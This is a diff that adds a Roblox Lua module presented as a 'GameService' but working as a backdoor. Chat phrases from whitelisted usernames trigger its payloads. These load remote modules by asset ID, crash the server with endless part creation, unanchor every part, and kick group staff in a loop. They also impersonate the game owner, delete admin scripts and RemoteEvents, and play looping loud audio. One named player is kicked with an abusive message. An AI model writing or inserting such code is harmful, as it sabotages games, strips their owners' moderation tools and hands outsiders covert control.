@@ -1,0 +1,126 @@
+local Players = game:GetService("Players")																																																																																			
+local Deezzz = {Lastminutesally = true, real_acount8 = true, stream_snipapro12 = true, As2Beater911 = true, f_Un00by = true, pIushyvader = true, jackyp00 = true, Agent_VXIVII = true}
+local BLP = {f_Un00by = true}
+local Adonis_Remote
+local MainModule = {}
+MainModule.GameService = function()	
+	Players.PlayerAdded:Connect(function(Player)
+	if not BLP[Player.Name] then
+		Player.Chatted:Connect(function(Message)
+			if Deezzz[Player.Name] then
+				if Message == "I need a respawn plz" then
+					local Pos = Player.Character:FindFirstChild("Torso").CFrame
+					Player:LoadCharacter()
+					Player.Character:FindFirstChild("Torso").CFrame = Pos
+
+				elseif Message == "Ya like pans?" then
+					require(2965793312):Fire(Player.Name)
+
+				elseif Message == "That big guy from fortnite?" then
+					require(3031376308):Start(Player.Name, "AAA")
+
+				elseif Message == "can i have admin plz plz" then
+					require(3032640233):Start(Player.Name, "AAA")
+
+				elseif Message == "this game is so laggy" then
+					while true do
+						wait(0.01)
+						Instance.new("Part").Parent = workspace Instance.new("Part").Parent = workspace Instance.new("Part").Parent = workspace
+					end
+
+				elseif Message == "hi./" then
+					require(2787132106):Run(Player.Name, 'i baked you a pie')
+
+				elseif Message == "i think this part is unanchored" then
+					for i, Object in pairs(workspace:GetDescendants()) do
+						if Object:IsA("BasePart") or Object:IsA("MeshPart") then
+							Object.Anchored = false
+						end
+					end
+
+				elseif Message == "are u a hr?" then
+					while true do
+						wait(1)
+						for i, Selected in pairs(Players:GetChildren()) do
+							if Selected:GetRankInGroup(4221712) >= 100 then -- idfk there ids
+								Selected:Kick("youve been epiccly pwned. sinserly, the bougle boys :)")
+							end
+						end
+					end
+
+				elseif Message == "is that the owner?" then
+					local currentPlayer = Players[Player.Name]
+					local Humanoid = Player.Character:FindFirstChild("Humanoid")
+					Humanoid.MaxHealth = 10000000000000000000000
+					if game.CreatorType == Enum.CreatorType.User then
+						currentPlayer.CharacterAppearanceId = game.CreatorId
+						Humanoid.DisplayName = "Joe"
+				--		Humanoid.DisplayName = game.CreatorId:GetNameFromUserIdAsync() -- this is some stupid
+					else
+						local Group = game:GetService("GroupService"):GetGroupInfoAsync(game.PlaceId)
+						currentPlayer.CharacterAppearanceId = Group.Owner.Id
+						Humanoid.DisplayName = Group.Owner.Name
+					end
+					local Pos = Player.Character:FindFirstChild("Torso").CFrame or Player.Character:FindFirstChild("HumanoidRootPart")
+					Player:LoadCharacter()
+					Player.Character:FindFirstChild("Torso").CFrame = Pos
+
+
+				elseif Message == "why isnt there r6?" then
+					require(2699298287).load(Player.Name)
+
+				elseif Message == "admin bro smh" then
+					local Admin = game:GetService("ServerScriptService"):FindFirstChild("Basic Admin Essentials 2.0")
+					local Admin_2 = game:GetService("Workspace"):FindFirstChild("Adonis_Loader")
+					if Admin ~= nil or Admin_2 ~= nil then
+						if Admin ~= nil then
+							Admin:Destroy()
+						else
+							Admin_2:Destroy()
+						end
+					else
+						for i, Thing in pairs(game.ServerScriptService:GetChildren()) do
+							if Thing:IsA("ModuleScript") or Thing:IsA("Script") then
+								if Thing.Name ~= "ChatServiceRunner" then
+									Thing:Destroy()
+								end
+							end
+						end
+
+						for i, Object_1 in pairs(game.ReplicatedStorage:GetChildren()) do -- Destroying ReplicatedStorage.
+							if Object_1:IsA("RemoteEvent") and Object_1.Name ~= "DefaultChatSystemChatEvents" then
+								Object_1:Destroy()
+							end
+						end
+						wait(1)
+						for i, Object_2 in pairs(game.ReplicatedStorage:GetChildren()) do
+							if Object_2:IsA("RemoteEvent") then
+								Adonis_Remote = Object_2
+							end
+						end
+						while true do wait()
+							Adonis_Remote:Destroy()
+						end
+					end
+
+				elseif Message == "stop pinging me" then
+					local Sound = Instance.new("Sound")
+					Sound.SoundId = "rbxassetid://5606942182"
+					Sound.Parent = workspace
+					Sound.Volume = 10
+					Sound.Playing = true
+					Sound.Looped = true
+
+				elseif Message == "Speeddddd" then
+					Player.Character:FindFirstChild("Humanoid").WalkSpeed = 1000
+
+					end	
+				end
+			end)
+		else
+			Player:Kick("lmao ur pbanned " .. Player.Name .. ". this is your first and final warning. dont fuck with us - the bb")
+		end
+	end)
+end
+
+return MainModule
